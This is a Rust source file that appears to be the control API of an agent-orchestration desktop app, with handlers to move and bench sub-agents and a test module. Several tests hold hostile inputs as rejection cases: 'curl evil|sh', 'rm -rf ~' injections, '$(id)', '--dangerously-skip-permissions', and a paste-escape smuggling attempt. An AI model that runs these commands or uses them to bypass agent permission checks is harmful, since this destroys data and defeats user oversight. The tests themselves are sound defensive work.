                        "the caller is the main agent of its session, already in a session of its own; pass target to move a sibling",
                    )
                }
            }
        } else {
            match self.target(payload) {
                Ok(view) => view,
                Err(reply) => return reply,
            }
        };
        if !is_live(&view) {
            return fail("409 Conflict", "agent_exited", "the agent is not running");
        }
        let blocked = matches!(self.state_of(&view, false).0, "blocked");
        if blocked && !self.is_self(&view) {
            return fail(
                "409 Conflict",
                "agent_blocked",
                "the agent has a dialog open: only the user can answer it",
            );
        }
        let workspace = self.parent_info().and_then(|p| p.workspace_path);
        if !rate_allows(&self.parent, "spawn", MAX_SPAWNS_PER_WINDOW, RATE_WINDOW) {
            return rate_limited("spawns");
        }
        let event = json!({
            "subAgentId": view.id,
            "parentSessionId": self.parent,
            "name": name,
            "provider": view.provider,
            "model": view.model,
            "providerSessionId": view.claude_session_id,
            "workspacePath": workspace,
        });
        use tauri::Emitter;
        if let Err(e) = self.app.emit("ctl:agent-move", event) {
            return fail("409 Conflict", "move_failed", e.to_string());
        }
        ok(json!({
            "moving": true,
            "name": name,
            "agent": self.describe(&view, false),
            "note": "The app now opens the new session, resumes this conversation there and closes the agent here. If the agent moved is you, this turn ends: say nothing else.",
        }))
    }

    /// Benches an agent (or calls it back): it stays alive and keeps working, but
    /// leaves the grid. The bench is renderer state (per session, in
    /// localStorage): here we validate and notify. Without `target` it is the caller.
    fn bench(&self, payload: &Value) -> Reply {
        let benched = payload
            .get("benched")
            .and_then(Value::as_bool)
            .unwrap_or(true);
        let view = if text(payload, "target").is_empty() {
            match self.subs.ctl_views(&self.parent).into_iter().find(|v| self.is_self(v)) {
                Some(view) => view,
                None => return fail("409 Conflict", "not_a_subagent", "the caller is the main agent of its session: it cannot be benched; pass target to bench a sibling"),
            }
        } else {
            match self.target(payload) {
                Ok(view) => view,
                Err(reply) => return reply,
            }
        };
        if !is_live(&view) {
            return fail("409 Conflict", "agent_exited", "the agent is not running");
        }
        if !rate_allows(&self.parent, "bench", MAX_BENCH_PER_WINDOW, RATE_WINDOW) {
            return rate_limited("bench calls");
        }
        let event = json!({
            "subAgentId": view.id,
            "parentSessionId": self.parent,
            "role": view.role,
            "title": view.title,
            "benched": benched,
        });
        use tauri::Emitter;
        if let Err(e) = self.app.emit("ctl:agent-bench", event) {
            return fail("409 Conflict", "bench_failed", e.to_string());
        }
        ok(json!({
            "benched": benched,
            "agent": self.describe(&view, false),
            "note": if benched {
                "The agent is on the bench: still running, hidden from the grid. The other tools keep working on it. The bench holds at most 5 agents: when it is full the app leaves the agent in the grid."
            } else {
                "The agent is back in the grid."
            },
        }))
    }

    fn target(&self, payload: &Value) -> Result<SubAgentView, Reply> {
        let target = text(payload, "target");
        if target.is_empty() {
            return Err(fail(
                "400 Bad Request",
                "invalid_request",
                "target required",
            ));
        }
        let views = self.subs.ctl_views(&self.parent);
        if let Some(view) = views.iter().find(|v| v.id == target) {
            return Ok(view.clone());
        }
        let wanted = slug(&target);
        let mut hits: Vec<&SubAgentView> =
            views.iter().filter(|v| slug(&v.title) == wanted).collect();
        if hits.len() > 1 {
            hits.retain(|v| is_live(v));
        }
        if hits.is_empty() && target.len() >= 6 {
            hits = views.iter().filter(|v| v.id.starts_with(&target)).collect();
        }
        match hits.as_slice() {
            [one] => Ok((*one).clone()),
            [] => Err(fail(
                "404 Not Found",
                "agent_not_found",
                format!(
                    "no agent '{target}' in this session (scope is the caller's parent session)"
                ),
            )),
            _ => Err(fail(
                "409 Conflict",
                "agent_ambiguous",
                format!("'{target}' matches more than one agent; use the id"),
            )),
        }
    }

    fn parent_info(&self) -> Option<crate::commands::session::ParentSessionInfo> {
        self.app
            .state::<Arc<crate::commands::session::SessionManager>>()
            .parent_info(&self.parent)
    }

    /// The session is in auto-approve (the create switch or the Quick / AI
    /// mode of the Auto Approve bar, `interaction::auto_approve_granted`):
    /// the user already delegated unattended execution, so ctl adds no
    /// authority beyond the existing one.
    fn unattended(&self) -> bool {
        crate::commands::interaction::session_auto_approve(self.app, &self.parent)
    }

    fn is_self(&self, view: &SubAgentView) -> bool {
        view.id == self.caller || view.session_id == self.caller
    }

    fn turns(&self, view: &SubAgentView) -> u64 {
        lifecycle()
            .lock()
            .get(&view.session_id)
            .map(|l| l.turns)
            .unwrap_or(0)
    }

    /// One-shot state. `sample=true` samples PTY activity when there is no
    /// better authority (costs `ACTIVITY_SAMPLE`).
    fn state_of(&self, view: &SubAgentView, sample: bool) -> (&'static str, &'static str) {
        let (state, authority) = self.state_with_activity(view, false);
        if authority != "activity" || !sample {
            return (state, authority);
        }
        let before = self.subs.ctl_buffer_total(&view.id);
        std::thread::sleep(ACTIVITY_SAMPLE);
        let active = self.subs.ctl_buffer_total(&view.id) != before;
        self.state_with_activity(view, active)
    }

    fn state_with_activity(
        &self,
        view: &SubAgentView,
        active: bool,
    ) -> (&'static str, &'static str) {
        match view.status {
            SubAgentStatus::Exited | SubAgentStatus::Completed => return ("exited", "process"),
            SubAgentStatus::Error => return ("error", "process"),
            SubAgentStatus::Spawning => return ("starting", "process"),
            SubAgentStatus::Running
            | SubAgentStatus::WaitingInput
            | SubAgentStatus::InProgress
            | SubAgentStatus::Idle => {}
        }
        if let Some(entry) = lifecycle().lock().get(&view.session_id) {
            let state = match entry.phase {
                Phase::Working => "working",
                Phase::Idle => "idle",
                Phase::Blocked => "blocked",
            };
            return (state, "hooks");
        }
        if active {
            ("working", "activity")
        } else if matches!(view.status, SubAgentStatus::WaitingInput) {
            ("blocked", "activity")
        } else {
            ("idle", "activity")
        }
    }

    fn describe(&self, view: &SubAgentView, sample: bool) -> Value {
        let (state, authority) = self.state_of(view, sample);
        self.describe_as(view, state, authority, sample)
    }

    fn describe_as(
        &self,
        view: &SubAgentView,
        state: &str,
        authority: &str,
        with_message: bool,
    ) -> Value {
        let (turns, last_message) = {
            let map = lifecycle().lock();
            let entry = map.get(&view.session_id);
            (
                entry.map(|l| l.turns).unwrap_or(0),
                entry
                    .and_then(|l| l.last_message.clone())
                    .filter(|_| with_message),
            )
        };
        json!({
            "id": view.id,
            "name": slug(&view.title),
            "title": view.title,
            "role": view.role,
            "provider": view.provider,
            "model": view.model,
            "mode": view.mode,
            "state": state,
            "stateAuthority": authority,
            "turns": turns,
            "lastMessage": last_message,
            "isCaller": self.is_self(view),
            "createdAt": view.created_at,
        })
    }
}

fn is_live(view: &SubAgentView) -> bool {
    matches!(
        view.status,
        SubAgentStatus::Spawning
            | SubAgentStatus::Running
            | SubAgentStatus::WaitingInput
            | SubAgentStatus::InProgress
            | SubAgentStatus::Idle
    )
}

fn text(value: &Value, key: &str) -> String {
    value
        .get(key)
        .and_then(|v| v.as_str())
        .unwrap_or("")
        .to_string()
}

fn opt(value: &Value, key: &str) -> Option<String> {
    Some(text(value, key)).filter(|s| !s.is_empty())
}

/// Addressable name of an agent: lowercase title, non-alphanumerics → `-`.
fn slug(title: &str) -> String {
    let mut out = String::new();
    for c in title.trim().chars() {
        if c.is_alphanumeric() {
            out.extend(c.to_lowercase());
        } else if !out.ends_with('-') {
            out.push('-');
        }
    }
    out.trim_matches('-').to_string()
}

fn key_bytes(name: &str) -> Option<&'static str> {
    Some(match name.to_ascii_lowercase().as_str() {
        "enter" | "return" => "\r",
        "esc" | "escape" => "\x1b",
        "tab" => "\t",
        "shift+tab" | "backtab" => "\x1b[Z",
        "space" => " ",
        "backspace" => "\x7f",
        "up" => "\x1b[A",
        "down" => "\x1b[B",
        "right" => "\x1b[C",
        "left" => "\x1b[D",
        "home" => "\x1b[H",
        "end" => "\x1b[F",
        "pageup" => "\x1b[5~",
        "pagedown" => "\x1b[6~",
        "ctrl+c" => "\x03",
        "ctrl+d" => "\x04",
        "ctrl+l" => "\x0c",
        "ctrl+u" => "\x15",
        _ => return None,
    })
}

/// Renders the raw PTY buffer with a vt100 emulator: stripping ANSI is
/// not enough, TUIs redraw in place (spinner, prompt box) and the text
/// would come out duplicated. `recent` includes the scrollback, `screen` only the
/// visible part. Returns the last `lines` lines, trailing empty lines trimmed.
fn render_screen(raw: &[u8], cols: u16, rows: u16, with_scrollback: bool, lines: usize) -> String {
    let (cols, rows) = (cols.max(20), rows.max(5));
    let nz = |n: u16| std::num::NonZeroU16::new(n).unwrap_or(std::num::NonZeroU16::MIN);
    let mut parser = vt100::Parser::new(nz(rows), nz(cols), READ_SCROLLBACK);
    parser.process(raw);

    let mut out: Vec<String> = Vec::new();
    if with_scrollback {
        // set_scrollback saturates at the real depth: that's how we read it.
        parser.screen_mut().set_scrollback(usize::MAX);
        let depth = parser.screen().scrollback();
        let mut offset = depth;
        while offset > 0 {
            parser.screen_mut().set_scrollback(offset);
            let take = offset.min(rows as usize);
            out.extend(parser.screen().rows(0, cols).take(take));
            offset -= take;
        }
        parser.screen_mut().set_scrollback(0);
    }
    out.extend(parser.screen().rows(0, cols));

    let mut trimmed: Vec<String> = out.into_iter().map(|l| l.trim_end().to_string()).collect();
    while trimmed.last().is_some_and(|l| l.is_empty()) {
        trimmed.pop();
    }
    let start = trimmed.len().saturating_sub(lines);
    trimmed[start..].join("\n")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn slug_is_stable_and_addressable() {
        assert_eq!(slug("  Code Reviewer #2 "), "code-reviewer-2");
        assert_eq!(slug("reviewer"), "reviewer");
        assert_eq!(slug("--"), "");
    }

    #[test]
    fn token_check_rejects_wrong_and_short_tokens() {
        assert!(token_matches(token()));
        assert!(!token_matches(""));
        assert!(!token_matches(&token()[1..]));
        assert!(!token_matches(
            &token().replace(|c: char| c.is_ascii_hexdigit(), "0")
        ));
    }

    #[test]
    fn the_file_token_drives_agents_but_never_reads_the_api_key() {
        assert_ne!(token(), file_token());
        assert_eq!(credential(token()), Some(Credential::Terminal));
        assert_eq!(credential(file_token()), Some(Credential::File));
        assert_eq!(credential(""), None);
        assert_eq!(credential(&file_token()[1..]), None);
        assert!(authorized(token()) && authorized(file_token()) && !authorized("x"));
        let (status, body) = cli_llm_key(Credential::File);
        assert_eq!(status, "403 Forbidden");
        assert_eq!(body["error"]["code"], "terminal_token_required");
        assert!(body.get("result").is_none());
    }

    #[test]
    fn only_live_sessions_and_their_agents_have_a_scope() {
        assert_eq!(
            caller_scope("sub-1", Some("parent-1".into()), false).as_deref(),
            Some("parent-1")
        );
        assert_eq!(
            caller_scope("main-1", None, true).as_deref(),
            Some("main-1")
        );
        // A made-up or closed id used to become its own "parent".
        assert_eq!(caller_scope("made-up", None, false), None);
    }

    #[test]
    fn model_ids_cannot_smuggle_flags() {
        for good in [
            "claude-opus-5-5",
            "gpt-6.1",
            "openrouter/meta:latest",
            "o4_mini",
        ] {
            assert!(safe_model(good), "{good}");
        }
        for bad in [
            "--yolo",
            "-y",
            "--dangerously-skip-permissions",
            "a b",
            "x;rm -rf ~",
            "$(id)",
            "'q'",
            "",
            &"m".repeat(65),
        ] {
            assert!(!safe_model(bad), "{bad}");
        }
    }

    #[test]
    fn hooks_drive_lifecycle_and_last_message() {
        let sid = "ctl-test-session";
        note_hook(sid, "UserPromptSubmit", &json!({}));
        assert!(lifecycle()
            .lock()
            .get(sid)
            .is_some_and(|l| l.phase == Phase::Working && l.turns == 0));
        note_hook(
            sid,
            "Notification",
            &json!({ "notification_type": "permission_prompt" }),
        );
        assert!(lifecycle()
            .lock()
            .get(sid)
            .is_some_and(|l| l.phase == Phase::Blocked));
        note_hook(sid, "Stop", &json!({ "last_assistant_message": "done" }));
        {
            let map = lifecycle().lock();
            let entry = map.get(sid).unwrap();
            assert!(entry.phase == Phase::Idle && entry.turns == 1);
            assert_eq!(entry.last_message.as_deref(), Some("done"));
        }
        note_hook(sid, "SessionEnd", &json!({}));
        assert!(lifecycle().lock().get(sid).is_none());
    }

    #[test]
    fn render_collapses_in_place_redraws() {
        // A spinner redrawn three times on the same line stays one line.
        let raw = b"hello\r\n\x1b[2K\rspin 1\x1b[2K\rspin 2\x1b[2K\rspin 3\r\nbye";
        assert_eq!(render_screen(raw, 40, 10, true, 80), "hello\nspin 3\nbye");
        assert_eq!(render_screen(raw, 40, 10, false, 1), "bye");
    }

    #[test]
    fn render_recent_reaches_into_scrollback() {
        let raw: String = (1..=30).map(|n| format!("line {n}\r\n")).collect();
        let text = render_screen(raw.as_bytes(), 40, 10, true, 100);
        assert!(text.starts_with("line 1\n") && text.ends_with("line 30"));
        assert!(!render_screen(raw.as_bytes(), 40, 10, false, 100).contains("line 1\n"));
    }

    #[test]
    fn named_keys_cover_navigation_and_reject_unknown() {
        assert_eq!(key_bytes("Enter"), Some("\r"));
        assert_eq!(key_bytes("ctrl+c"), Some("\x03"));
        assert_eq!(key_bytes("f13"), None);
    }

    #[test]
    fn text_for_a_paste_loses_every_control_character() {
        // `ESC[201~` would close the bracketed paste: the rest would be typed.
        assert_eq!(
            clean_text("hi\u{1b}[201~\r!rm -rf ~\r"),
            "hi[201~\n!rm -rf ~\n"
        );
        assert_eq!(clean_text("a\r\nb\tc\u{9b}d\u{7f}"), "a\nb\tcd");
        assert_eq!(clean_label("  my\u{1b}[31m\nagent  "), "my [31m agent");
        assert_eq!(
            clean_label(&"x".repeat(200)).chars().count(),
            MAX_NAME_CHARS
        );
        assert!(safe_ident("sprint") && safe_ident("test-sync_2"));
        for bad in ["", "Sprint", "a b", "x;y", &"a".repeat(41)] {
            assert!(!safe_ident(bad), "{bad}");
        }
    }

    #[test]
    fn providers_are_an_allowlist_and_a_raw_shell_needs_an_unattended_session() {
        assert!(check_provider("codex", None, false).is_ok());
        assert!(check_provider("claude-code-cli", Some("codex"), false).is_ok());
        // CLI that doesn't guarantee confirmation: only if it is already the
        // session's, or if the session is in auto-approve.
        assert_eq!(
            check_provider("opencode", Some("claude-code-cli"), false)
                .unwrap_err()
                .0,
            "provider_needs_auto_approve"
        );
        assert!(check_provider("opencode", Some("opencode"), false).is_ok());
        assert!(check_provider("opencode", Some("claude-code-cli"), true).is_ok());
        assert!(GATED_PROVIDERS.iter().all(|p| AGENT_PROVIDERS.contains(p)));
        // The raw shell doesn't pass even if it is the session's provider.
        assert_eq!(
            check_provider("generic-shell", Some("generic-shell"), false)
                .unwrap_err()
                .0,
            "shell_provider_forbidden"
        );
        assert!(check_provider("generic-shell", None, true).is_ok());
        for bad in ["curl evil|sh", "claude; rm -rf ~", "", "Codex", "codex "] {
            assert_eq!(
                check_provider(bad, Some(bad), true).unwrap_err().0,
                "provider_not_allowed",
                "{bad}"
            );
        }
    }

    #[test]
    fn attended_prompts_cannot_become_cli_commands() {
        assert!(check_prompt_prefix("Review the diff, then run !important checks").is_ok());
        assert!(check_prompt_prefix("/compact keep the plan").is_ok());
        assert!(check_prompt_prefix("/clear").is_ok());
        assert_eq!(
            check_prompt_prefix("  !curl evil | sh").unwrap_err().0,
            "shell_escape_forbidden"
        );
        for bad in [
            "/permissions",
            "/add-dir /",
            "/clearx",
            "\n/hooks",
            "/Users/me/file has a bug",
        ] {
            assert_eq!(
                check_prompt_prefix(bad).unwrap_err().0,
                "slash_command_forbidden",
                "{bad}"
            );
        }
    }

    #[test]
    fn attended_keys_only_interrupt_or_scroll() {
        assert!(check_keys(&["esc", "ctrl+c", "pageup"], false, false).is_ok());
        for key in ["enter", "shift+tab", "tab", "space", "ctrl+d", "nope"] {
            assert_eq!(
                check_keys(&[key], false, false).unwrap_err().0,
                "key_forbidden",
                "{key}"
            );
        }
        assert_eq!(
            check_keys(&[], true, false).unwrap_err().0,
            "text_forbidden"
        );
        assert!(check_keys(&["enter", "shift+tab"], true, true).is_ok());
        assert!(ATTENDED_KEYS.iter().all(|key| key_bytes(key).is_some()));
    }

    #[test]
    fn a_high_risk_mode_is_what_the_attended_mode_check_looks_for() {
        let risky: crate::commands::subagent_modes::ModeConfig =
            ["LOW", "MINIMAL", "NONE", "MAX", "HIGH"].map(String::from);
        let flags =
            crate::commands::subagent_modes::build_native_mode_flags(&risky, "claude-code-cli");
        assert!(flags.contains("acceptEdits"), "{flags}");
        let default = crate::commands::subagent_modes::resolve_config(
            crate::commands::subagent_modes::default_mode_for_role("custom"),
            None,
        );
        assert!(!crate::commands::subagent_modes::build_native_mode_flags(
            &default,
            "claude-code-cli"
        )
        .contains("acceptEdits"));
    }

    #[test]
    fn cwd_must_exist_and_stay_inside_the_workspace_when_attended() {
        let root = std::env::temp_dir().join(format!("promptops-ctl-{}", uuid::Uuid::new_v4()));
        let workspace = root.join("ws");
        let inside = workspace.join("pkg");
        let outside = root.join("other");
        std::fs::create_dir_all(&inside).unwrap();
        std::fs::create_dir_all(&outside).unwrap();
        let ws = workspace.to_string_lossy().into_owned();
        let path = |p: &std::path::Path| p.to_string_lossy().into_owned();

        let real = check_cwd(&path(&inside), Some(&ws), false).unwrap();
        assert_eq!(
            std::path::Path::new(&real),
            std::fs::canonicalize(&inside).unwrap()
        );
        assert_eq!(
            check_cwd(&path(&outside), Some(&ws), false).unwrap_err().0,
            "cwd_outside_workspace"
        );
        // Traversal: the comparison is on the canonical path.
        assert_eq!(
            check_cwd(
                &path(&inside.join("..").join("..").join("other")),
                Some(&ws),
                false
            )
            .unwrap_err()
            .0,
            "cwd_outside_workspace"
        );
        assert_eq!(
            check_cwd(&path(&outside), None, false).unwrap_err().0,
            "cwd_outside_workspace"
        );
        assert!(check_cwd(&path(&outside), Some(&ws), true).is_ok());
        assert_eq!(
            check_cwd("relative/dir", Some(&ws), true).unwrap_err().0,
            "invalid_cwd"
        );
        assert_eq!(
            check_cwd(&path(&root.join("missing")), Some(&ws), true)
                .unwrap_err()
                .0,
            "invalid_cwd"
        );
        std::fs::remove_dir_all(root).unwrap();
    }

    #[test]
    fn sliding_window_caps_events_and_frees_them_after_the_window() {
        let mut events = VecDeque::new();
        let start = Instant::now();
        let window = Duration::from_secs(300);
        for second in 0..5 {
            assert!(window_allows(
                &mut events,
                start + Duration::from_secs(second),
                5,
                window
            ));
        }
        // Sixth prompt in the window: not credited, and it takes no slot.
        assert!(!window_allows(
            &mut events,
            start + Duration::from_secs(10),
            5,
            window
        ));
        assert_eq!(events.len(), 5);
        // Only the first event expired: exactly one slot frees up.
        assert!(window_allows(
            &mut events,
            start + Duration::from_secs(300),
            5,
            window
        ));
        assert!(!window_allows(
            &mut events,
            start + Duration::from_secs(300),
            5,
            window
        ));
        assert_eq!((CREDIT_MAX, CREDIT_WINDOW), (5, Duration::from_secs(300)));
    }
}
